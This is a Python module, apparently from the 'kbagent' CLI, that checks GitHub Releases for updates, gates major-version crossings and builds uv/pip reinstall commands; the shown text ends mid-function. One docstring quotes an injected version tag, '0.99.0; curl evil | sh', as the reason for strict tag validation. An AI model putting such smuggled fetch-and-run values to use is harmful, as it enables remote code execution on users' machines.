"""Version service - detect local versions and check for updates.

Provides version information for kbagent, which is auto-updated on startup
(see auto_update.py) and explicitly via ``kbagent update``. The latest
version is resolved from GitHub Releases.
"""

import enum
import importlib.util
import logging
import os
import shlex
import shutil
import subprocess
import time
from collections.abc import Mapping
from dataclasses import dataclass
from datetime import UTC, datetime
from email.utils import parsedate_to_datetime
from typing import Any

import httpx
from packaging.version import InvalidVersion, Version

from .. import __version__
from ..constants import (
    ENV_UPDATE_TIMEOUT,
    KBAGENT_GITHUB_REPO,
    KBAGENT_INSTALL_SOURCE,
    MAJOR_MIGRATION_DELAY_SECONDS,
    NEXT_MAJOR_RECHECK_SECONDS,
    RELEASE_LIST_MAX_PAGES,
    RELEASE_LIST_PAGE_SIZE,
    UPDATE_TIMEOUT_SECONDS,
    VERSION_CHECK_TIMEOUT,
)
from ..frozen_dist import FrozenDistribution, detect_frozen_distribution
from ..update_runner import (
    DeferredUpdateRequest,
    InstallStatus,
    pending_update_target,
    request_deferred_update,
    run_install,
    should_defer,
)

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class KbagentUpdatePlan:
    """All information needed to perform the terminal kbagent reinstall."""

    current_version: str
    latest_version: str | None
    up_to_date: bool | None
    command: tuple[str, ...] | None
    recovery_command: str | None
    #: Set only when running as a frozen (PyInstaller) native binary, in which
    #: case ``command`` and ``recovery_command`` are deliberately None: a uv/pip
    #: reinstall cannot upgrade a Chocolatey / Homebrew / apt / dnf install and
    #: would create an unrelated second copy instead (see
    #: :mod:`keboola_agent_cli.frozen_dist`). Consumers must report this
    #: channel's own upgrade command rather than attempting the install --
    #: including the deferred Windows path, which is equally inapplicable.
    #: Defaulted so the existing positional constructions stay valid.
    frozen_distribution: FrozenDistribution | None = None
    #: ``latest_version`` is of a higher major than the running one. Such an
    #: install always goes through the deferred helper, on every OS, so the
    #: current command finishes on the old major and no command line runs
    #: again under the new one (#791 UP2).
    crosses_major: bool = False
    #: The crossing was asked for with ``kbagent update --major``.
    major_flag: bool = False
    #: No release of the running major in the newest pages of the release list.
    same_major_missing: bool = False


@dataclass(frozen=True)
class UpdatePlan:
    """Immutable explicit-update plan, prepared before the environment mutates."""

    kbagent: KbagentUpdatePlan
    gated: "GatedRelease | None" = None


def has_server_extras() -> bool:
    """Detect whether the current install was created with ``[server]`` extras.

    The detection probe is ``importlib.util.find_spec('fastapi')``: FastAPI
    is pulled in *only* by the optional ``[server]`` extra (declared in
    ``pyproject.toml``'s ``[project.optional-dependencies]`` table), so its
    presence is a reliable proxy for "user originally installed with
    ``--with 'keboola-cli[server]'``".

    Used by every kbagent self-upgrade path (``kbagent update`` and the
    startup auto-update hook) to decide whether to pair ``uv tool install``
    with ``--with 'keboola-cli[server]'`` -- without that flag, the
    fresh re-resolution silently drops the FastAPI + uvicorn extras and
    breaks ``kbagent serve --ui`` for users who originally installed with
    ``[server]``. (Bug fixed in v0.40.2 for the explicit ``kbagent update``
    path; extended to the startup auto-update hook in v0.41.1.)
    """
    return importlib.util.find_spec("fastapi") is not None


def resolve_kbagent_wheel_url(
    version: str | None, *, timeout: float = VERSION_CHECK_TIMEOUT
) -> str | None:
    """Return the prebuilt-wheel Release asset URL for ``version`` if present.

    The ``release.yml`` workflow (issue #353) attaches a universal
    ``keboola_cli-<version>-py3-none-any.whl`` to every GitHub release.
    Installing that prebuilt wheel skips the on-machine npm/React SPA build that
    makes ``git+`` installs take minutes on WSL.

    A lightweight HEAD probe (verified to return 200 through GitHub's asset CDN
    redirect) confirms the asset actually exists -- releases published before the
    workflow have none, and those must fall back to the ``git+`` source build.

    Args:
        version: Target version (no ``v`` prefix), e.g. ``"0.60.0"``. The tag is
            ``v<version>`` and the asset filename embeds the same version.
        timeout: HEAD-probe timeout in seconds.

    Returns:
        The asset URL on HTTP 200, or ``None`` on any non-200 / network error so
        the caller falls back to :data:`KBAGENT_INSTALL_SOURCE` (git+).
    """
    if not version:
        return None
    url = (
        f"https://github.com/{KBAGENT_GITHUB_REPO}/releases/download/"
        f"v{version}/keboola_cli-{version}-py3-none-any.whl"
    )
    try:
        resp = httpx.head(url, follow_redirects=True, timeout=timeout)
    except httpx.HTTPError:
        return None
    return url if resp.status_code == 200 else None


def get_update_timeout() -> float:
    """Resolve the kbagent self-update subprocess timeout in seconds.

    Defaults to :data:`UPDATE_TIMEOUT_SECONDS`; ``KBAGENT_UPDATE_TIMEOUT``
    overrides it (a ``git+`` source build on WSL can exceed the default -- raise
    it there). Non-numeric or non-positive overrides fall back to the default
    rather than disabling the timeout entirely.
    """
    raw = os.environ.get(ENV_UPDATE_TIMEOUT, "").strip()
    if raw:
        try:
            value = float(raw)
        except ValueError:
            return float(UPDATE_TIMEOUT_SECONDS)
        if value > 0:
            return value
    return float(UPDATE_TIMEOUT_SECONDS)


def _uv_link_mode_args() -> tuple[str, ...]:
    """Extra ``uv tool install`` args forcing copy link mode on Windows.

    Issue #786: when the uv cache or the tool directory sits on a cloud-synced
    volume (OneDrive Files-On-Demand and similar), uv's default hardlink mode
    fails with ``os error 396`` (ERROR_CLOUD_FILE_INCOMPATIBLE_HARDLINKS).
    By then ``--force --reinstall`` has already removed the old tool venv, so
    kbagent disappears entirely.

    Used only on the failure path: the one-time retry after a hardlink error
    (:func:`build_hardlink_retry_command`) and the printed recovery command.
    The regular install keeps uv's default, so users whose disks can hardlink
    do not pay for the slower copy. Windows only: POSIX command lines stay
    byte-identical. A user-set ``UV_LINK_MODE`` is respected -- uv reads it
    itself, and an explicit flag would override the user's choice.
    """
    if os.name != "nt" or os.environ.get("UV_LINK_MODE"):
        return ()
    return ("--link-mode", "copy")


def _is_uv_command(command: tuple[str, ...]) -> bool:
    """Whether ``command`` runs uv (as opposed to the pip fallback)."""
    executable = command[0].replace("\\", "/").rsplit("/", maxsplit=1)[-1].casefold()
    return executable in {"uv", "uv.exe"}


def build_hardlink_retry_command(command: tuple[str, ...] | None) -> tuple[str, ...] | None:
    """Return ``command`` in copy link mode, for one retry after a hardlink error.

    The deferred Windows helper runs this only when the first install failed
    and uv's output reports a hardlink failure (issue #786).

    Returns:
        The retry argv, or ``None`` when no retry applies: no command, a pip
        command, a non-Windows host, or a user-set ``UV_LINK_MODE``.
    """
    if command is None or not _is_uv_command(command):
        return None
    link_mode = _uv_link_mode_args()
    if not link_mode:
        return None
    return (*command[:-1], *link_mode, command[-1])


def build_kbagent_upgrade_command(
    *, target_version: str, wheel_url: str | None = None
) -> list[str] | None:
    """Build the argv command to recreate the kbagent tool environment.

    Used by both ``kbagent update`` (explicit) and the startup
    auto-update hook so the two paths stay byte-for-byte consistent --
    in particular, both preserve the optional ``[server]`` extras when
    they were originally installed.

    The source is always a direct reference to one release, so a beta needs no
    pre-release opt-in. The command never passes ``--prerelease=allow`` /
    ``--pre``: they apply to every dependency, and with them uv installed
    ``httpx 1.0.dev6`` into a beta environment, which has no ``httpx.Timeout``.

    Args:
        target_version: Exact target release. The git source is always pinned
            to ``@v<target_version>``: ``main`` can carry the code of the next
            major before it is released (#791), so an untagged install is never
            built.
        wheel_url: When set, install the prebuilt wheel at this URL (a GitHub
            Release asset) via a PEP 508 direct reference instead of building
            from ``git+`` source -- the issue #353 fast path that skips the
            on-machine npm/React build. Takes precedence over ``target_version``
            (a git-source knob; the wheel URL already pins an exact version).
            ``None`` keeps the git+ behaviour.

    Returns:
        Command list ready for :func:`subprocess.run`, or ``None`` if
        neither ``uv`` nor ``pip`` is on ``PATH`` (in which case the
        caller surfaces a manual-install hint).
    """
    # The wheel is already an exact release artifact. When it is unavailable,
    # pin the source fallback to the corresponding immutable Git tag.
    install_source = wheel_url or f"{KBAGENT_INSTALL_SOURCE}@v{target_version}"
    spec = f"keboola-cli{'[server]' if has_server_extras() else ''} @ {install_source}"
    uv_path = shutil.which("uv")
    if uv_path:
        return [uv_path, "tool", "install", "--force", "--reinstall", spec]
    pip_path = shutil.which("pip")
    if pip_path is None:
        return None
    # Pip cannot recreate a uv-managed tool environment transactionally; it
    # remains a best-effort fallback and is called out in failure guidance.
    return [pip_path, "install", "--upgrade", spec]


def _render_command(command: tuple[str, ...]) -> str:
    """Render argv for the current platform's interactive shell."""
    if os.name == "nt":
        return subprocess.list2cmdline(command)
    return shlex.join(command)


def _recovery_command(command: tuple[str, ...] | None, target_version: str | None) -> str | None:
    """Render an exact forced-reinstall command safe to copy after failure."""
    if command is not None:
        if _is_uv_command(command):
            # The regular install keeps uv's default link mode; the recovery
            # runs after a failure, so it gets copy mode on Windows (#786).
            recovery = ("uv", *command[1:-1], *_uv_link_mode_args(), command[-1])
        else:
            recovery = (
                "uv",
                "tool",
                "install",
                "--force",
                "--reinstall",
                *_uv_link_mode_args(),
                command[-1],
            )
        return _render_command(recovery)
    if target_version is None:
        return None
    extras = "[server]" if has_server_extras() else ""
    source = f"keboola-cli{extras} @ {KBAGENT_INSTALL_SOURCE}@v{target_version}"
    return _render_command(
        ("uv", "tool", "install", "--force", "--reinstall", *_uv_link_mode_args(), source)
    )


def summarize_install_failure(output: str | None) -> str:
    """Return the last non-empty line of an installer transcript, or "".

    uv and pip print their actionable line last (for example
    ``error: Executable already exists: kbagent (use `--force` to overwrite)``),
    so this is the cause to show in a one-line failure message.
    """
    lines = [line.strip() for line in (output or "").splitlines() if line.strip()]
    return lines[-1] if lines else ""


@dataclass(frozen=True)
class NextMajorRelease:
    """The GitHub release ``v<N+1>.0.0`` as the major gate sees it (#791 section 4.3).

    ``published_at`` is the ISO-8601 UTC value GitHub returns. It is ``None``
    when the release existed but its tag now answers 404 (deleted after T0):
    the migration date is then unknown and the client holds the crossing.
    """

    version: str
    release_id: int | None
    published_at: str | None

    def published_ts(self) -> float | None:
        return _parse_iso_timestamp(self.published_at)

    def migration_ts(self) -> float | None:
        """M: ``published_at`` plus :data:`MAJOR_MIGRATION_DELAY_SECONDS`, or None."""
        published = self.published_ts()
        return None if published is None else published + MAJOR_MIGRATION_DELAY_SECONDS


@dataclass(frozen=True)
class GatedRelease:
    """Result of :func:`fetch_gated_release`.

    ``latest_version`` is what this client may install: the highest release
    of the running major, or a release of the next major when the gate allows
    the crossing. ``same_major_version`` is the highest release of the running
    major; only that one is written to the startup cache, which clients older
    than the gate also read (None on a crossing run, where it is not looked
    up). ``latest_version`` None means the lookup failed (offline, proxy, HTTP
    403/429): nothing is installed then.
    """

    latest_version: str | None
    same_major_version: str | None
    next_major: NextMajorRelease | None = None
    #: Local time of the last read of the ``v<N+1>.0.0`` release (cache key ``checked_at``).
    checked_at: float | None = None
    #: The ``Date`` header of the GitHub response; None when nothing was fetched
    #: or the header was missing (a crossing then waits).
    server_now: float | None = None
    #: The release list was read, but its newest pages hold no release of the
    #: running major (``latest_version`` is None for that reason, not offline).
    same_major_missing: bool = False

    @property
    def crosses_major(self) -> bool:
        return _major_of(self.latest_version) > _major_of(__version__)


def _major_of(version: str | None) -> int:
    """Major part of ``version``; -1 when it is missing or not PEP 440."""
    if not version:
        return -1
    try:
        return Version(version).major
    except InvalidVersion:
        return -1


def _parse_iso_timestamp(value: object) -> float | None:
    if not isinstance(value, str) or not value:
        return None
    try:
        parsed = datetime.fromisoformat(value)
    except ValueError:
        return None
    if parsed.tzinfo is None:
        parsed = parsed.replace(tzinfo=UTC)
    return parsed.timestamp()


def _server_now(response: httpx.Response) -> float | None:
    """The ``Date`` header of a GitHub response, so a wrong local clock does not move M.

    None when the header is missing or invalid: the caller then holds the
    crossing, and only the notice text falls back to the local clock.
    """
    raw = response.headers.get("Date")
    if not raw:
        return None
    try:
        parsed = parsedate_to_datetime(raw)
    except (TypeError, ValueError, IndexError):
        return None
    if parsed.tzinfo is None:
        # `-0000` ("UTC, source unknown") parses as a naive datetime.
        parsed = parsed.replace(tzinfo=UTC)
    return parsed.timestamp()


@dataclass(frozen=True)
class _Answer:
    """One GitHub answer: status, JSON body (200 only) and its ``Date`` header."""

    status: int
    body: Any
    server_now: float | None


def _github_get(
    path: str, *, timeout: float, params: dict[str, Any] | None = None
) -> _Answer | None:
    """GET a GitHub API path; None when no answer was read.

    ``ValueError`` is caught with ``httpx.HTTPError``: httpx raises it for an
    unsupported proxy scheme (``HTTPS_PROXY=ftp://...``) before any request,
    and for a 200 body that is not JSON. Either way the lookup is offline.
    """
    try:
        response = httpx.get(
            f"https://api.github.com/repos/{KBAGENT_GITHUB_REPO}{path}",
            timeout=timeout,
            follow_redirects=True,
            headers={"Accept": "application/vnd.github.v3+json"},
            params=params,
        )
        body = response.json() if response.status_code == 200 else None
    except (httpx.HTTPError, ValueError):
        logger.debug("GitHub request %s failed", path, exc_info=True)
        return None
    return _Answer(response.status_code, body, _server_now(response))


def _release_version(entry: object) -> tuple[Version, str] | None:
    """Parse a release entry's tag; None for a draft or a tag that is not PEP 440.

    Validated strictly before the version can reach the install command or the
    wheel URL: an adversarial tag like ``0.99.0; curl evil | sh`` must not pass
    on its valid prefix (GHSA-x6cx-93j8-pgwj). Returns the canonical PEP 440
    form (``v0.43.0-beta.1`` -> ``0.43.0b1``).
    """
    if not isinstance(entry, dict) or entry.get("draft"):
        return None
    tag = str(entry.get("tag_name", ""))
    try:
        parsed = Version(tag.removeprefix("v"))
    except InvalidVersion:
        logger.debug("Ignoring malformed GitHub release tag %r", tag)
        return None
    return parsed, str(parsed)


def _is_stable(entry: dict[str, Any], parsed: Version) -> bool:
    return not entry.get("prerelease") and not parsed.is_prerelease


def _highest(candidates: list[tuple[Version, str]]) -> str | None:
    return max(candidates)[1] if candidates else None


@dataclass(frozen=True)
class _ListedRelease:
    version: Version
    text: str
    stable: bool


@dataclass(frozen=True)
class _Page:
    listed: list[_ListedRelease]
    server_now: float | None
    #: The page held a full page of entries, so an older page may exist.
    full: bool


def _read_release_list(timeout: float, *, page: int = 1) -> _Page | None:
    """``GET /releases?per_page=100[&page=N]``: drafts and invalid tags dropped; None on failure."""
    params: dict[str, Any] = {"per_page": RELEASE_LIST_PAGE_SIZE}
    if page > 1:
        params["page"] = page
    answer = _github_get("/releases", timeout=timeout, params=params)
    if answer is None or answer.status != 200 or not isinstance(answer.body, list):
        return None
    listed = []
    for entry in answer.body:
        parsed = _release_version(entry)
        if parsed is not None:
            listed.append(_ListedRelease(parsed[0], parsed[1], _is_stable(entry, parsed[0])))
    return _Page(listed, answer.server_now, len(answer.body) >= RELEASE_LIST_PAGE_SIZE)


@dataclass(frozen=True)
class _SameMajor:
    version: str | None
    #: The pages were read but held no release of the running major.
    missing: bool


def _same_major_from_pages(
    first: _Page | None, major: int, *, include_prerelease: bool, timeout: float
) -> _SameMajor | None:
    """Highest release of ``major`` in the release list; None when a page read failed.

    Reads older pages (up to :data:`RELEASE_LIST_MAX_PAGES`) only while the
    pages read so far hold no release of ``major`` -- the case of a held 0.x
    install after more than 100 releases of 1.x.
    """
    page = first if first is not None else _read_release_list(timeout)
    number = 1
    listed: list[_ListedRelease] = []
    while page is not None:
        listed += page.listed
        found = _highest(_of_major(listed, major, include_prerelease=include_prerelease))
        if found is not None or not page.full or number >= RELEASE_LIST_MAX_PAGES:
            return _SameMajor(found, found is None)
        number += 1
        page = _read_release_list(timeout, page=number)
    return None


def _of_major(
    listed: list[_ListedRelease], major: int, *, include_prerelease: bool
) -> list[tuple[Version, str]]:
    return [
        (item.version, item.text)
        for item in listed
        if item.version.major == major and (item.stable or include_prerelease)
    ]


def next_major_from_cache(
    cache: Mapping[str, Any] | None, major: int
) -> tuple[NextMajorRelease | None, float | None]:
    """Read the next-major keys of the startup cache.

    Returns the cached release (None when none is known) and ``checked_at``,
    the last read of ``v<major>.0.0`` -- also kept when that read found
    nothing, so the tag is read at most once per 24 hours. Keys written for
    another major are ignored.
    """
    if not cache:
        return None, None
    raw_checked = cache.get("checked_at")
    checked_at = float(raw_checked) if isinstance(raw_checked, int | float) else None
    version = cache.get("next_major_version")
    if version is None:
        return None, checked_at
    if not isinstance(version, str) or _major_of(version) != major:
        return None, None
    release_id = cache.get("next_major_release_id")
    published_at = cache.get("next_major_published_at")
    return (
        NextMajorRelease(
            version=version,
            release_id=release_id if isinstance(release_id, int) else None,
            published_at=published_at if isinstance(published_at, str) else None,
        ),
        checked_at,
    )


def next_major_cache_keys(gated: GatedRelease) -> dict[str, Any]:
    """The next-major keys of the startup cache for ``gated``.

    Only ``checked_at`` when the last read found no next major; nothing when
    the release was never read.
    """
    keys: dict[str, Any] = {}
    if gated.checked_at is not None:
        keys["checked_at"] = gated.checked_at
    if gated.next_major is not None:
        keys["next_major_version"] = gated.next_major.version
        keys["next_major_release_id"] = gated.next_major.release_id
        keys["next_major_published_at"] = gated.next_major.published_at
    return keys


class _TagLookup(enum.Enum):
    FOUND = "found"
    MISSING = "missing"
    FAILED = "failed"


def _fetch_next_major(major: int, timeout: float) -> tuple[_TagLookup, NextMajorRelease | None]:
    """Read ``GET /releases/tags/v<major>.0.0``.

    Only a published, stable release counts as found. A 404 is MISSING; any
    other failure (network, proxy, 403 or 429 rate limit, 5xx) is FAILED.
    """
    answer = _github_get(f"/releases/tags/v{major}.0.0", timeout=timeout)
    if answer is None:
        return _TagLookup.FAILED, None
    if answer.status == 404:
        return _TagLookup.MISSING, None
    if answer.status != 200 or not isinstance(answer.body, dict):
        return _TagLookup.FAILED, None
    entry = answer.body
    parsed = _release_version(entry)
    if parsed is None or not _is_stable(entry, parsed[0]) or parsed[0].major != major:
        return _TagLookup.MISSING, None
    published_at = entry.get("published_at")
    release_id = entry.get("id")
    return _TagLookup.FOUND, NextMajorRelease(
        version=parsed[1],
        release_id=release_id if isinstance(release_id, int) else None,
        published_at=published_at if isinstance(published_at, str) else None,
    )


def _merge_next_major(found: NextMajorRelease, cached: NextMajorRelease | None) -> NextMajorRelease:
    """Apply the re-publish rule: a new release ID never shortens the 28 days.

    A release with a new ID and a later ``published_at`` restarts the window
    (that is just the new value). A new ID with an EARLIER date keeps the
    cached, later date, so editing the releases can only postpone M.
    """
    if cached is None or cached.release_id is None or found.release_id == cached.release_id:
        return found
    new_ts, old_ts = found.published_ts(), cached.published_ts()
    if new_ts is not None and old_ts is not None and new_ts < old_ts:
        return NextMajorRelease(found.version, found.release_id, cached.published_at)
    return found


@dataclass(frozen=True)
class _Recheck:
    next_major: NextMajorRelease | None


def _recheck_next_major(
    major: int, cached: NextMajorRelease | None, timeout: float, *, seen: bool
) -> _Recheck | None:
    """Read ``v<major>.0.0``; None when the lookup failed.

    A 404 after the release was ``seen`` (cached, or named by
    ``/releases/latest``) means it was deleted after T0: the result holds the
    crossing with an unknown date. A 404 before that means no next major.
    """
    outcome, found = _fetch_next_major(major, timeout)
    if outcome is _TagLookup.FAILED:
        return None
    if found is not None:
        return _Recheck(_merge_next_major(found, cached))
    return _Recheck(NextMajorRelease(f"{major}.0.0", None, None) if seen else None)


def fetch_gated_release(
    *,
    timeout: float = VERSION_CHECK_TIMEOUT,
    include_prerelease: bool = False,
    allow_major: bool = False,
    cache: Mapping[str, Any] | None = None,
) -> GatedRelease:
    """Resolve the release this client may install: the major gate (#791 section 4.3).

    Requests, smallest first:

    * ``GET /releases/latest`` (stable channel). When it names the running
      major, that is the same-major version. When it names a higher major
      (after M, or a misconfigured release), ``GET /releases?per_page=100``
      is read once for the highest stable release of the running major.
      ``include_prerelease`` (``--beta``) reads that list instead, as the
      pre-release path always did.
    * ``GET /releases/tags/v<N+1>.0.0`` at most once per
      :data:`NEXT_MAJOR_RECHECK_SECONDS` (a 404 means no next major), and
      once more right before a crossing at M.
    * The list again only to find the newest release of the next major for a
      crossing, when ``/releases/latest`` does not already name it.

    The next major is allowed only at or after M -- ``published_at`` of
    ``v<N+1>.0.0`` plus 28 days, compared with the ``Date`` header of the
    GitHub response (no header: no crossing) -- or with ``allow_major``
    (``kbagent update --major``). ``include_prerelease`` alone never crosses.
    Generic over the major: a 1.x client gates 2.x the same way. Any failed
    fetch (network, proxy, HTTP 403 or 429, 5xx) installs nothing.

    Args:
        timeout: Timeout of each GitHub request, in seconds.
        include_prerelease: Consider pre-releases (``--beta``).
        allow_major: Allow the next major before M (``kbagent update --major``).
        cache: The startup cache, for its next-major keys.
    """
    try:
        running = Version(__version__)
    except InvalidVersion:
        return GatedRelease(None, None)
    next_number = running.major + 1
    cached_next, cached_checked = next_major_from_cache(cache, next_number)
    offline = GatedRelease(None, None, cached_next, cached_checked)

    listed: list[_ListedRelease] | None = None
    first_page: _Page | None = None
    latest: tuple[Version, str] | None = None
    if include_prerelease:
        first_page = _read_release_list(timeout)
        if first_page is None:
            return offline
        listed, server_now = first_page.listed, first_page.server_now
    else:
        answer = _github_get("/releases/latest", timeout=timeout)
        if answer is None or answer.status != 200:
            return offline
        latest = _release_version(answer.body)
        if latest is None:
            return offline
        server_now = answer.server_now
    seen = cached_next is not None or (latest is not None and latest[0].major == next_number)
    if listed is not None:
        seen = seen or any(i.stable and i.version.major == next_number for i in listed)

    next_major, checked_at = cached_next, cached_checked
    checked_now = False
    # An explicit `update --major` always reads the tag: the daily memo of a
    # 404 must not hide a release published since.
    stale = checked_at is None or time.time() - checked_at >= NEXT_MAJOR_RECHECK_SECONDS
    if allow_major or stale:
        lookup = _recheck_next_major(next_number, cached_next, timeout, seen=seen)
        if lookup is not None:
            next_major, checked_at, checked_now = lookup.next_major, time.time(), True

    may_cross = allow_major
    migration = next_major.migration_ts() if next_major is not None else None
    at_migration = migration is not None and server_now is not None and server_now >= migration
    if not allow_major and not include_prerelease and at_migration:
        if not checked_now:
            # Once more right before the crossing installs anything; a
            # failed lookup holds the crossing.
            lookup = _recheck_next_major(next_number, cached_next, timeout, seen=True)
            if lookup is None:
                migration = None
            else:
                next_major, checked_at = lookup.next_major, time.time()
                migration = next_major.migration_ts() if next_major is not None else None
        may_cross = migration is not None and server_now is not None and server_now >= migration

    # `--beta --major` may take a pre-release of the next major before a
    # stable `v<N+1>.0.0` exists; the automatic crossing and the notice still
    # need the stable release.
    beta_major = allow_major and include_prerelease
    target: str | None = None
    if may_cross and (next_major is not None or beta_major):
        if latest is not None and latest[0].major == next_number:
            target = latest[1]
        else:
            if listed is None:
                first_page = _read_release_list(timeout)
                listed = first_page.listed if first_page is not None else []
            target = _highest(_of_major(listed, next_number, include_prerelease=include_prerelease))
    if target is not None:
        return GatedRelease(target, None, next_major, checked_at, server_now)

    if latest is not None and latest[0].major <= running.major:
        return GatedRelease(latest[1], latest[1], next_major, checked_at, server_now)
    same = _same_major_from_pages(
        first_page,
        running.major,
        include_prerelease=include_prerelease,
        timeout=timeout,
    )
    if same is None:
        return GatedRelease(None, None, next_major, checked_at, server_now)
    return GatedRelease(
        same.version, same.version, next_major, checked_at, server_now, same.missing
    )


def _is_up_to_date(local: str | None, latest: str | None) -> bool | None:
    """Compare local and latest versions.

    Args:
        local: Locally installed version string.
        latest: Latest available version string.

    Returns:
        True if up to date, False if update available, None if comparison not possible.
    """
    if local is None or latest is None:
        return None
    try:
        return Version(local) >= Version(latest)
    except InvalidVersion:
        return None


def prepare_kbagent_update_plan(
    latest_version: str | None,
    *,
    major_flag: bool = False,
    same_major_missing: bool = False,
) -> KbagentUpdatePlan:
    """Prepare the terminal self-reinstall without mutating any environment.

    For a frozen (PyInstaller) binary no install command is produced at all --
    neither ``command`` nor ``recovery_command``. Both would be uv/pip
    invocations that install a *separate* copy rather than upgrading the running
    binary, so the plan instead carries the detected
    :class:`~keboola_agent_cli.frozen_dist.FrozenDistribution` and callers report
    that channel's upgrade command. A ``command`` of None also means the
    deferred Windows helper is never handed anything to install. The wheel-URL
    HEAD probe is skipped too, since its only purpose is building that command.
    """
    up_to_date = _is_up_to_date(__version__, latest_version)
    frozen_distribution = detect_frozen_distribution()
    command: tuple[str, ...] | None = None
    if up_to_date is False and latest_version is not None and frozen_distribution is None:
        wheel_url = resolve_kbagent_wheel_url(latest_version)
        built = build_kbagent_upgrade_command(target_version=latest_version, wheel_url=wheel_url)
        command = tuple(built) if built is not None else None
    return KbagentUpdatePlan(
        current_version=__version__,
        latest_version=latest_version,
        up_to_date=up_to_date,
        command=command,
        recovery_command=(
            _recovery_command(command, latest_version)
            if up_to_date is False and frozen_distribution is None
            else None
        ),
        frozen_distribution=frozen_distribution,
        crosses_major=up_to_date is False and _major_of(latest_version) > _major_of(__version__),
        major_flag=major_flag,
        same_major_missing=same_major_missing,
    )


def _read_startup_cache() -> dict[str, Any] | None:
    """The startup cache of :mod:`..auto_update`, for its next-major keys."""
    # Lazy import: ``auto_update`` imports this module at module load.
    try:
        from ..auto_update import _read_cache

        return _read_cache()
    except Exception:
        logger.debug("Could not read the version cache", exc_info=True)
        return None


def _cache_same_major(gated: GatedRelease, cache: Mapping[str, Any] | None) -> str | None:
    """The same-major version for the startup cache.

    A crossing run does not look the same-major version up; it keeps the
    cached one instead of replacing it with the running version, which would
    delay a same-major update by one cache TTL.
    """
    if gated.same_major_version is not None or gated.latest_version is None:
        return gated.same_major_version
    cached = cache.get("latest_version") if cache else None
    if isinstance(cached, str) and _major_of(cached) == _major_of(__version__):
        return cached
    return None


def _register_notice(gated: GatedRelease) -> None:
    """Keep the deprecation notice for the output layer (``version`` and ``update``)."""
    try:
        from ..auto_update import register_deprecation_notice

        register_deprecation_notice(gated.next_major, now=gated.server_now)
    except Exception:
        logger.debug("Could not build the deprecation notice", exc_info=True)


def prepare_update_plan(
    *, include_prerelease: bool = False, allow_major: bool = False
) -> UpdatePlan:
    """Complete the update lookup before the updater is allowed to run."""
    # Resolve the latest version first. This ordering prevents a mutated
    # kbagent environment from making a later HTTPS check fail.
    gated = fetch_gated_release(
        include_prerelease=include_prerelease,
        allow_major=allow_major,
        cache=_read_startup_cache(),
    )
    return UpdatePlan(
        kbagent=prepare_kbagent_update_plan(
            gated.latest_version,
            major_flag=allow_major,
            same_major_missing=gated.same_major_missing,
        ),
        gated=gated,
    )


class VersionService:
    """Business logic for version detection and update checks."""

    def get_versions(self, *, include_prerelease: bool = False) -> dict[str, Any]:
        """Get version information for kbagent.

        kbagent is auto-updated on startup (see
        :mod:`keboola_agent_cli.auto_update`) and explicitly via
        ``kbagent update``. This method reports:

        - the local installed version,
        - the latest available version (GitHub Releases),
        - the up-to-date status,
        - the upgrade command shown to the user.

        Args:
            include_prerelease: When True, ``latest_version`` reflects the
                newest pre-release (beta / rc) if one is more recent than
                the latest stable; surfaces what ``kbagent update --beta``
                would install.

        Returns:
            Structured dict with kbagent version info.
        """
        startup_cache = _read_startup_cache()
        gated = fetch_gated_release(include_prerelease=include_prerelease, cache=startup_cache)
        kbagent_latest = gated.latest_version
        kbagent_up_to_date = _is_up_to_date(__version__, kbagent_latest)
        _register_notice(gated)

        # Persist the freshly-fetched version to the auto-update cache so
        # the next ``kbagent <anything>`` startup hook sees it instead of
        # a stale TTL'd entry. Before v0.41.1 this method bypassed the
        # cache entirely, which meant ``kbagent version`` would show
        # ``v0.41.0 available`` while a follow-up ``kbagent serve --ui`` on
        # the same machine still auto-updated to whatever stale version
        # the cache held (e.g. 0.40.3). Lazy-imported to avoid a circular
        # import: ``auto_update`` imports from this module at module load.
        #
        # Not under ``--beta`` (#791 UP4): a pre-release found here would be
        # installed by the next startup of a client older than the gate. And
        # only the running major's version: a higher major in this shared file
        # is what such a client would install too (#791 section 4.3).
        try:
            from ..auto_update import _write_cache

            if not include_prerelease:
                _write_cache(
                    latest_version=_cache_same_major(gated, startup_cache),
                    next_major_keys=next_major_cache_keys(gated),
                )
        except Exception:
            # Cache write is best-effort; never fail the version command
            # because the cache could not be persisted (read-only HOME,
            # disk full, permission error, etc.).
            logger.debug("Could not persist version cache", exc_info=True)

        # Reflect the actual install command the user should run, including
        # the @v<version> tag-pin when --beta is active.
        # Without this, programmatic JSON consumers reading upgrade_command
        # would copy a stable-channel install command even though
        # latest_version advertised a beta tag -- silently landing on the
        # wrong version.
        kbagent_target_version = kbagent_latest
        # A frozen native binary is upgraded by the package manager that placed
        # it. Advertising the uv/pip command here would hand every Chocolatey /
        # Homebrew / apt / dnf user a copy-pasteable way to install a SECOND,
        # unrelated kbagent (see frozen_dist.py) -- so the channel's own command
        # replaces it, and the wheel-URL HEAD probe is skipped as dead weight.
        frozen_distribution = detect_frozen_distribution()
        if frozen_distribution is not None:
            # Keep `upgrade_command` a RUNNABLE command or nothing. A consumer
            # that shells out to it verbatim -- the use the gotchas entry
            # documents -- must never be handed the prose hint. Channels with no
            # single command (hand-unpacked archive, unidentified system
            # package) carry the sentence in `upgrade_hint` instead.
            kbagent_upgrade_str = frozen_distribution.upgrade_command or ""
        elif kbagent_up_to_date is not False or kbagent_target_version is None:
            # Nothing to upgrade TO, so name nothing. `upgrade_command` is
            # documented as a string a consumer may shell out to verbatim, and
            # this branch used to build one unconditionally -- which made the two
            # non-`False` states hand out actively wrong commands:
            #
            # * ``True`` (local >= latest). A caller on a pre-release compares
            #   ahead of the stable release a non-``--beta`` fetch returns
            #   (``0.44.0b1`` >= ``0.43.3``), so it was told ``up_to_date: true``
            #   AND given a ``--force --reinstall`` command pinned to the older
            #   stable wheel. Running it is a silent downgrade off the beta --
            #   exactly the foot-gun the beta channel's three gates exist to
            #   prevent.
            # * ``None`` (release feed unreachable, or an unparseable version).
            #   ``resolve_kbagent_wheel_url(None)`` yields no asset, so this fell
            #   through to the unpinned ``git+`` source install -- resolving
            #   whatever the default branch happens to be, on the one code path
            #   that reached it precisely because kbagent could not establish
            #   what the current release is.
            #
            # `mirror the _update_kbagent path` (issue #353, NB-1) still holds
            # for the real ``False`` case below.
            kbagent_upgrade_str = ""
        else:
            # Mirror the _update_kbagent path (issue #353, NB-1): advertise the
            # prebuilt-wheel install command when the asset exists, so a programmatic
            # consumer copy-pasting `upgrade_command` from `kbagent version --json`
            # gets the fast path too instead of a slow git+ source build.
            kbagent_wheel_url = resolve_kbagent_wheel_url(kbagent_latest)
